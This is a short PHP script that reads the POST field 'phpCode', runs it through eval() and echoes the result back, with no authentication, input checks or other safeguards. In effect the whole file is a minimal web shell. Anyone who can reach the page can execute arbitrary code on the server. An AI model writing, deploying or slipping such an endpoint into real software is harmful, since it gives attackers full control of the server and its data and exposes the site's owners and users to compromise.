<?php
if (isset($_POST['phpCode'])) {
    $phpCode = $_POST['phpCode'];

    ob_start();

    eval($phpCode);

    $output = ob_get_clean();

    echo $output;
} else {
    echo "No PHP code provided.";
}
